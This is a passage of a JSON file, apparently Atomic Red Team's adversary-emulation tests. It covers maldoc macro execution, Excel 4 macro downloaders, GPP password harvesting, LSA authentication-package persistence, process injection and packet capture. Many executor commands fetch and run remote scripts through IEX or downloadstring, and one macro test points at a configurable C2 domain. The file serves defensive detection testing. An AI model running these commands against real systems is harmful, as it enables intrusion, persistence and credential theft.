			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript #{jse_path}`\", vbNormalFocus)`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1204.002",
		"phases": ["execution"]
	},
	{
		"name": "Office launching .bat file from AppData",
		"auto_generated_guid": "9215ea92-1ded-41b7-9cd6-79f9a78397aa",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"bat_path": {
				"description": "Path to malicious .bat file",
				"type": "string",
				"default": "$(\"$env:temp\\art1204.bat\")"
			},
			"ms_product": {
				"description": "Maldoc application Word or Excel",
				"type": "string",
				"default": "Word"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Microsoft #{ms_product} must be installed\n",
				"prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
			}
		],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{bat_path}`\" For Output As #1`n   Write #1, `\"calc.exe`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c #{bat_path} `\", vbNormalFocus)`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}\n",
			"cleanup_command": "Remove-Item #{bat_path} -ErrorAction Ignore\nGet-Process | Where-Object { $_.MainModule.FileName -like \"*calculator*\" } | Stop-Process\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1204.002",
		"phases": ["execution"]
	},
	{
		"name": "Excel 4 Macro",
		"auto_generated_guid": "4ea1fc97-8a46-4b4e-ba48-af43d2a98052",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"download_url": {
				"description": "Download URL",
				"type": "string",
				"default": "https://live.sysinternals.com/procexp.exe"
			},
			"uname": {
				"description": "Username for pathing",
				"type": "string",
				"default": "$env:Username"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Microsoft Excel must be installed\n",
				"prereq_command": "try {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Microsoft Excel manually to meet this requirement\"\n"
			}
		],
		"executor": {
			"command": "$fname = \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\"\n$fname1 = \"$env:TEMP\\procexp.exe\"\nif (Test-Path $fname) {\n  Remove-Item $fname\n  Remove-Item $fname1\n}\n\n$xlApp = New-Object -COMObject \"Excel.Application\"\n$xlApp.Visible = $True\n$xlApp.DisplayAlerts = $False\n$xlBook = $xlApp.Workbooks.Add()\n$sheet = $xlBook.Excel4MacroSheets.Add()\n\nif (\"#{uname}\" -ne \"\") {\n  $sheet.Cells.Item(1,1) = \"#{uname}\"\n} else {\n  $sheet.Cells.Item(1,1) = \"=GET.WORKSPACE(26)\"\n}\n\n$sheet.Cells.Item(2,1) = \"procexp.exe\"\n$sheet.Cells.Item(3,1) = \"atomic_redteam_x4m_exec.vbs\"\n$sheet.Cells.Item(4,1) = \"=IF(ISNUMBER(SEARCH(`\"64`\",GET.WORKSPACE(1))), GOTO(A5),)\"\n$sheet.Cells.Item(5,1) = \"=FOPEN(`\"C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A3&`\"`\", 3)\"\n$sheet.Cells.Item(6,1) = \"=FWRITELN(A5, `\"url = `\"`\"#{download_url}`\"`\"`\")\"\n$sheet.Cells.Item(7,1) = \"=FWRITELN(A5, `\"`\")\"\n$sheet.Cells.Item(8,1) = \"=FWRITELN(A5, `\"Set winHttp = CreateObject(`\"`\"WinHTTP.WinHTTPrequest.5.1`\"`\")`\")\"\n$sheet.Cells.Item(9,1) = \"=FWRITELN(A5, `\"winHttp.Open `\"`\"GET`\"`\", url, False`\")\"\n$sheet.Cells.Item(10,1) = \"=FWRITELN(A5, `\"winHttp.Send`\")\"\n$sheet.Cells.Item(11,1) = \"=FWRITELN(A5, `\"If winHttp.Status = 200 Then`\")\"\n$sheet.Cells.Item(12,1) = \"=FWRITELN(A5, `\"Set oStream = CreateObject(`\"`\"ADODB.Stream`\"`\")`\")\"\n$sheet.Cells.Item(13,1) = \"=FWRITELN(A5, `\"oStream.Open`\")\"\n$sheet.Cells.Item(14,1) = \"=FWRITELN(A5, `\"oStream.Type = 1`\")\"\n$sheet.Cells.Item(15,1) = \"=FWRITELN(A5, `\"oStream.Write winHttp.responseBody`\")\"\n$sheet.Cells.Item(16,1) = \"=FWRITELN(A5, `\"oStream.SaveToFile `\"`\"C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A2&`\"`\"`\", 2`\")\"\n$sheet.Cells.Item(17,1) = \"=FWRITELN(A5, `\"oStream.Close`\")\"\n$sheet.Cells.Item(18,1) = \"=FWRITELN(A5, `\"End If`\")\"\n$sheet.Cells.Item(19,1) = \"=FCLOSE(A5)\"\n$sheet.Cells.Item(20,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A3&`\"`\")\"\n$sheet.Cells.Item(21,1) = \"=WAIT(NOW()+`\"00:00:05`\")\"\n$sheet.Cells.Item(22,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A2&`\"`\")\"\n$sheet.Cells.Item(23,1) = \"=HALT()\"\n$sheet.Cells.Item(1,1).Name = \"runme\"\n$xlApp.Run(\"runme\")\n$xlApp.Quit()\n\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null\n[System.GC]::Collect()\n[System.GC]::WaitForPendingFinalizers()\n\nRemove-Variable xlBook\nRemove-Variable xlApp\n",
			"cleanup_command": "Stop-Process -Name \"procexp*\" -ErrorAction Ignore\nRemove-Item \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\" -ErrorAction Ignore\nRemove-Item \"$env:TEMP\\procexp.exe\" -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1204.002",
		"phases": ["execution"]
	},
	{
		"name": "Headless Chrome code execution via VBA",
		"auto_generated_guid": "a19ee671-ed98-4e9d-b19c-d1954a51585a",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Microsoft Word must be installed\n",
				"prereq_command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  Stop-Process -Name \"winword\"\n  exit 0 } catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
			},
			{
				"description": "Google Chrome must be installed\n",
				"prereq_command": "try {\n  $chromeInstalled = (Get-Item (Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe').'(Default)').VersionInfo.FileName\n  exit 0\n} catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Google Chrome manually to meet this requirement\"\n"
			}
		],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1204.002\\src\\chromeexec-macrocode.txt\" -officeProduct \"Word\" -sub \"ExecChrome\"\n",
			"name": "powershell",
			"cleanup_command": "Stop-Process -name mshta\n",
			"elevation_required": false
		},
		"attack_technique": "T1204.002",
		"phases": ["execution"]
	},
	{
		"name": "Potentially Unwanted Applications (PUA)",
		"auto_generated_guid": "02f35d62-9fdc-4a97-b899-a5d9a876d295",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"pua_url": {
				"description": "url to PotentiallyUnwanted.exe",
				"type": "url",
				"default": "http://amtso.eicar.org/PotentiallyUnwanted.exe"
			},
			"pua_file": {
				"description": "path to PotentiallyUnwanted.exe",
				"type": "path",
				"default": "$env:TEMP/PotentiallyUnwanted.exe"
			}
		},
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "Invoke-WebRequest #{pua_url} -OutFile #{pua_file}\n& \"#{pua_file}\"\n",
			"cleanup_command": "Stop-Process -name PotentiallyUnwanted\nRemove-Item #{pua_file} -ErrorAction Ignore\n"
		},
		"attack_technique": "T1204.002",
		"phases": ["execution"]
	},
	{
		"name": "Office Generic Payload Download",
		"auto_generated_guid": "5202ee05-c420-4148-bf5e-fd7f7d24850c",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"macro_path": {
				"description": "Location of file which will be converted to a VBA macro\n",
				"type": "path",
				"default": "PathToAtomicsFolder/T1204.002/src/test9-GenericPayloadDownload.txt"
			},
			"c2_domain": {
				"description": "This required variable points to a user defined HTTP server that will host the file_name in the c2_parent_directory.\n",
				"type": "url",
				"default": null
			},
			"c2_parent_directory": {
				"description": "Parent directory where you have the \"malicious\" file on c2_domain server.\nWill default to root directory. Forward slashes are not needed at begining or ending of directory path\n",
				"type": "path",
				"default": ""
			},
			"file_name": {
				"description": "\"Malicious\" file to be downloaded.\nThis required file needs to be place on the user provided c2 domain\nExample file can be found at PathToAtomicsFolder/T1204.002/src/test9-example-payload.txt\n",
				"type": "string",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt"
			},
			"ms_product": {
				"description": "Maldoc application Word or Excel\n",
				"type": "string",
				"default": "Word"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Destination c2_domain name or IP address must be set to a running HTTP server.\n",
				"prereq_command": "if (#{c2_domain}) (exit 0) else (exit 1)\n",
				"get_prereq_command": "Write-Host \"Destination c2 server domain name or IP address must be set and reachable for HTTP service\"\n"
			},
			{
				"description": "Microsoftt #{ms_product} must be installed\n",
				"prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
			}
		],
		"executor": {
			"name": "powershell",
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macroCode = Get-Content \"#{macro_path}\" -Raw\n$URL = \"#{c2_domain}\" + \"/\" + \"#{c2_parent_directory}\"\n$macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', \"#{file_name}\"\nInvoke-MalDoc -macroCode $macroCode -officeProduct \"#{ms_product}\"\n",
			"cleanup_command": "Remove-Item \"C:\\Users\\$env:username\\Desktop\\#{file_name}\" -ErrorAction Ignore\n",
			"elevation_required": false
		},
		"attack_technique": "T1204.002",
		"phases": ["execution"]
	},
	{
		"name": "LNK Payload Download",
		"auto_generated_guid": "581d7521-9c4b-420e-9695-2aec5241167f",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Invoke-WebRequest -OutFile $env:Temp\\test10.lnk \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk\"\n$file1 = \"$env:Temp\\test10.lnk\"\nStart-Process $file1\nStart-Sleep -s 10\ntaskkill /IM a.exe /F\n",
			"cleanup_command": "$file1 = \"$env:Temp\\test10.lnk\"\n$file2 = \"$env:Temp\\a.exe\"\nRemove-Item $file1 -ErrorAction Ignore\nRemove-Item $file2 -ErrorAction Ignore",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1204.002",
		"phases": ["execution"]
	},
	{
		"name": "Mirror Blast Emulation",
		"auto_generated_guid": "24fd9719-7419-42dd-bce6-ab3463110b3c",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Cd \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\"\nNew-ItemProperty -Path Registry::HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Excel\\Security -Name \"VBAWarnings\" -Value \"1\" -PropertyType DWORD -Force | Out-Null\n& '.\\Excel 2016.lnk' \"PathToAtomicsFolder\\T1204.002\\bin\\mirrorblast_emulation.xlsm\"",
			"cleanup_command": "reg delete \"HKCU\\SOFTWARE\\Microsoft\\Office\\16.0\\Excel\\Security\" /v \"VBAWarnings\" /f",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1204.002",
		"phases": ["execution"]
	},
	{
		"name": "GPP Passwords (findstr)",
		"auto_generated_guid": "870fe8fb-5e23-4f5f-b89d-dd7fe26f3b5f",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Computer must be domain joined\n",
				"prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"
			}
		],
		"executor": {
			"command": "findstr /S cpassword %logonserver%\\sysvol\\*.xml\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1552.006",
		"phases": ["credential-access"]
	},
	{
		"name": "GPP Passwords (Get-GPPPassword)",
		"auto_generated_guid": "e9584f82-322c-474a-b831-940fd8b4455c",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"gpp_script_url": {
				"description": "URL of the Get-GPPPassword PowerShell Script",
				"type": "url",
				"default": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1"
			},
			"gpp_script_path": {
				"description": "Path to the Get-GPPPassword PowerShell Script",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\Get-GPPPassword.ps1"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}\n",
				"prereq_command": "if(Test-Path \"#{gpp_script_path}\") {exit 0 } else {exit 1 }\n",
				"get_prereq_command": "New-Item -ItemType Directory (Split-Path \"#{gpp_script_path}\") -Force | Out-Null\nInvoke-WebRequest #{gpp_script_url} -OutFile \"#{gpp_script_path}\"\n"
			},
			{
				"description": "Computer must be domain joined\n",
				"prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"
			}
		],
		"executor": {
			"command": ". \"#{gpp_script_path}\"\nGet-GPPPassword -Verbose\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1552.006",
		"phases": ["credential-access"]
	},
	{
		"name": "Octopus Scanner Malware Open Source Supply Chain",
		"auto_generated_guid": "82a9f001-94c5-495e-9ed5-f530dbded5e2",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"rat_payload": {
				"description": "RAT dropper ExplorerSync.db",
				"type": "path",
				"default": "$env:TEMP\\ExplorerSync.db"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "ExplorerSync.db must exist on disk at specified location (#{rat_payload})\n",
				"prereq_command": "if (Test-Path #{rat_payload}) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Out-File -FilePath \"#{rat_payload}\"\n"
			}
		],
		"executor": {
			"command": "copy %temp%\\ExplorerSync.db %temp%\\..\\Microsoft\\ExplorerSync.db\nschtasks /create /tn ExplorerSync /tr \"javaw -jar %temp%\\..\\Microsoft\\ExplorerSync.db\" /sc MINUTE /f\n",
			"cleanup_command": "schtasks /delete /tn ExplorerSync /F 2>null\ndel %temp%\\..\\Microsoft\\ExplorerSync.db 2>null\ndel %temp%\\ExplorerSync.db 2>null\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1195",
		"phases": ["initial-access"]
	},
	{
		"name": "Win32_PnPEntity Hardware Inventory",
		"auto_generated_guid": "2cb4dbf2-2dca-4597-8678-4d39d207a3a5",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\\T1120_collection.txt\n$Space,$Heading,$Break,$Data = Get-Content $env:TEMP\\T1120_collection.txt\n@($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne \"\" } |Set-Content $env:TEMP\\T1120_collection.txt",
			"cleanup_command": "Remove-Item $env:TEMP\\T1120_collection.txt -ErrorAction Ignore",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1120",
		"phases": ["discovery"]
	},
	{
		"name": "WinPwn - printercheck",
		"auto_generated_guid": "cb6e76ca-861e-4a7f-be08-564caa3e6f75",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nprintercheck -noninteractive -consoleoutput",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1120",
		"phases": ["discovery"]
	},
	{
		"name": "Peripheral Device Discovery via fsutil",
		"auto_generated_guid": "424e18fd-48b8-4201-8d3a-bf591523a686",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "fsutil fsinfo drives",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1120",
		"phases": ["discovery"]
	},
	{
		"name": "Authentication Package",
		"auto_generated_guid": "be2590e8-4ac3-47ac-b4b5-945820f2fbe9",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Copy-Item \"$PathToAtomicsFolder\\T1547.002\\bin\\package.dll\" C:\\Windows\\System32\\\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Authentication Packages\" /t REG_MULTI_SZ /d \"msv1_0\\0package.dll\" /f\n",
			"cleanup_command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Authentication Packages\" /t REG_MULTI_SZ /d \"msv1_0\" /f\nrm -force C:\\windows\\system32\\package.dll\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1547.002",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Process Injection via Extra Window Memory (EWM) x64 executable",
		"auto_generated_guid": "93ca40d2-336c-446d-bcef-87f14d438018",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"arch": {
				"description": "Architecture of payload. One of (x64, x86)",
				"type": "string",
				"default": "x64"
			},
			"exe_binary": {
				"description": "PE binary for EWM injection",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1055.011\\bin\\T1055.011_#{arch}.exe"
			},
			"payload_file": {
				"description": "raw payload to inject",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1055.011\\bin\\payload.exe_#{arch}.bin"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "T1055.011x64.exe and payload must exist on disk at specified location (#{exe_binary} and #{payload_file})",
				"prereq_command": "if (Test-Path #{exe_binary}) {exit 0} else {exit 1}",
				"get_prereq_command": "New-Item -Type Directory (split-path #{exe_binary}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/T1055.011_#{arch}.exe\" -OutFile \"#{exe_binary}\" -UseBasicParsing\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/payload.exe_#{arch}.bin\" -OutFile \"#{payload_file}\" -UseBasicParsing"
			}
		],
		"executor": {
			"command": "#{exe_binary}",
			"cleanup_command": "Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1055.011",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Packet Capture Linux using tshark or tcpdump",
		"auto_generated_guid": "7fe741f7-b265-4951-a7c7-320889083b3e",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"interface": {
				"description": "Specify interface to perform PCAP on.",
				"type": "string",
				"default": "ens33"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "Check if at least one of tcpdump or tshark is installed.\n",
				"prereq_command": "if [ ! -x \"$(command -v tcpdump)\" ] && [ ! -x \"$(command -v tshark)\" ]; then exit 1; else exit 0; fi;\n",
				"get_prereq_command": "(which yum && yum -y install epel-release tcpdump tshark)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y tcpdump tshark)\n"
			}
		],
		"executor": {
			"command": "tcpdump -c 5 -nnni #{interface}\ntshark -c 5 -i #{interface}\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1040",
		"phases": ["credential-access", "discovery"]
	},
	{
		"name": "Packet Capture FreeBSD using tshark or tcpdump",
		"auto_generated_guid": "c93f2492-9ebe-44b5-8b45-36574cccfe67",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"interface": {
				"description": "Specify interface to perform PCAP on.",
				"type": "string",
				"default": "em0"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if at least one of tcpdump or tshark is installed.\n",
				"prereq_command": "if [ ! -x \"$(command -v tcpdump)\" ] && [ ! -x \"$(command -v tshark)\" ]; then exit 1; else exit 0; fi;\n",
				"get_prereq_command": "(which pkg && pkg install -y wireshark-nox11)\n"
			}
		],
		"executor": {
			"command": "tcpdump -c 5 -nnni #{interface}\ntshark -c 5 -i #{interface}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1040",
		"phases": ["credential-access", "discovery"]
	},
	{
		"name": "Packet Capture macOS using tcpdump or tshark",
		"auto_generated_guid": "9d04efee-eff5-4240-b8d2-07792b873608",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"interface": {
				"description": "Specify interface to perform PCAP on.",
				"type": "string",
				"default": "en0A"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "Check if at least one of tcpdump or tshark is installed.\n",
				"prereq_command": "if [ ! -x \"$(command -v tcpdump)\" ] && [ ! -x \"$(command -v tshark)\" ]; then exit 1; else exit 0; fi;\n",
				"get_prereq_command": "(which yum && yum -y install epel-release tcpdump tshark)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y tcpdump tshark)\n"
			}
		],
		"executor": {
			"command": "sudo tcpdump -c 5 -nnni #{interface}    \nif [ -x \"$(command -v tshark)\" ]; then sudo tshark -c 5 -i #{interface}; fi;\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1040",
		"phases": ["credential-access", "discovery"]
	},
	{
		"name": "Packet Capture Windows Command Prompt",
		"auto_generated_guid": "a5b2f6a0-24b4-493e-9590-c699f75723ca",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"interface": {
				"description": "Specify interface to perform PCAP on.",
				"type": "string",
				"default": "Ethernet"
			},
			"wireshark_url": {
				"description": "wireshark installer download URL",
				"type": "url",
				"default": "https://1.eu.dl.wireshark.org/win64/Wireshark-latest-x64.exe"
			},
			"tshark_path": {
				"description": "path to tshark.exe",
				"type": "path",
				"default": "c:\\program files\\wireshark\\tshark.exe"
			},
			"npcap_url": {
				"description": "npcap installed download URL",
				"type": "url",
				"default": "https://nmap.org/npcap/dist/npcap-1.31.exe"
			},
			"npcap_path": {
				"description": "path to npcap.sys",
				"type": "path",
				"default": "C:\\Program Files\\Npcap\\npcap.sys"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "tshark must be installed and in the default path of \"c:\\Program Files\\Wireshark\\Tshark.exe\".\n",
				"prereq_command": "if (test-path \"#{tshark_path}\") {exit 0} else {exit 1}",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\wireshark_installer.exe\" #{wireshark_url}\nStart-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\wireshark_installer.exe\" /S\n"
			},
			{
				"description": "npcap must be installed.\n",
				"prereq_command": "if (test-path \"#{npcap_path}\") {exit 0} else {exit 1}",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\npcap_installer.exe\" #{npcap_url}\nStart-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\npcap_installer.exe\"\n"
			}
		],
		"executor": {
			"command": "\"c:\\Program Files\\Wireshark\\tshark.exe\" -i #{interface} -c 5\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1040",
		"phases": ["credential-access", "discovery"]
	},
	{
		"name": "Windows Internal Packet Capture",
		"auto_generated_guid": "b5656f67-d67f-4de8-8e62-b5581630f528",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "netsh trace start capture=yes tracefile=%temp%\\trace.etl maxsize=10",
			"cleanup_command": "netsh trace stop >nul 2>&1\nTIMEOUT /T 5 >nul 2>&1\ndel %temp%\\trace.etl >nul 2>&1\ndel %temp%\\trace.cab >nul 2>&1",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1040",
		"phases": ["credential-access", "discovery"]
	},
	{
		"name": "Windows Internal pktmon capture",
		"auto_generated_guid": "c67ba807-f48b-446e-b955-e4928cd1bf91",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "pktmon.exe start --etw  -f %TEMP%\\t1040.etl\nTIMEOUT /T 5 >nul 2>&1\npktmon.exe stop\n",
			"cleanup_command": "del %TEMP%\\t1040.etl",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1040",
		"phases": ["credential-access", "discovery"]
	},
	{
		"name": "Windows Internal pktmon set filter",
		"auto_generated_guid": "855fb8b4-b8ab-4785-ae77-09f5df7bff55",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "pktmon.exe filter add -p 445\n",
			"cleanup_command": "pktmon filter remove",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1040",
		"phases": ["credential-access", "discovery"]
	},
	{
		"name": "Packet Capture macOS using /dev/bpfN with sudo",
		"auto_generated_guid": "e6fe5095-545d-4c8b-a0ae-e863914be3aa",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"ifname": {
				"description": "Specify interface to perform PCAP on.",
				"type": "string",
				"default": "en0"
			},
			"csource_path": {
				"description": "Path to C program source",
				"type": "string",
				"default": "PathToAtomicsFolder/T1040/src/macos_pcapdemo.c"
			},
			"program_path": {
				"description": "Path to compiled C program",
				"type": "string",
				"default": "/tmp/t1040_macos_pcapdemo"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "compile C program\n",
				"prereq_command": "exit 1\n",
				"get_prereq_command": "cc #{csource_path} -o #{program_path}\n"
			}
		],
		"executor": {
			"command": "sudo #{program_path} -i #{ifname} -t 3\n",
			"cleanup_command": "rm -f #{program_path}\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1040",
		"phases": ["credential-access", "discovery"]
	},
	{
		"name": "Filtered Packet Capture macOS using /dev/bpfN with sudo",
		"auto_generated_guid": "e2480aee-23f3-4f34-80ce-de221e27cd19",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"ifname": {
				"description": "Specify interface to perform PCAP on.",
				"type": "string",
				"default": "en0"
			},
			"csource_path": {
				"description": "Path to C program source",
				"type": "string",
				"default": "PathToAtomicsFolder/T1040/src/macos_pcapdemo.c"
			},
			"program_path": {
				"description": "Path to compiled C program",
				"type": "string",
				"default": "/tmp/t1040_macos_pcapdemo"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "compile C program\n",
				"prereq_command": "exit 1\n",
				"get_prereq_command": "cc #{csource_path} -o #{program_path}\n"
			}
		],
		"executor": {
			"command": "sudo #{program_path} -f -i #{ifname} -t 3\n",
			"cleanup_command": "rm -f #{program_path}\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1040",
		"phases": ["credential-access", "discovery"]
	},
	{
		"name": "Packet Capture FreeBSD using /dev/bpfN with sudo",
		"auto_generated_guid": "e2028771-1bfb-48f5-b5e6-e50ee0942a14",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"ifname": {
				"description": "Specify interface to perform PCAP on.",
				"type": "string",
				"default": "em0"
			},
			"csource_path": {
				"description": "Path to C program source",
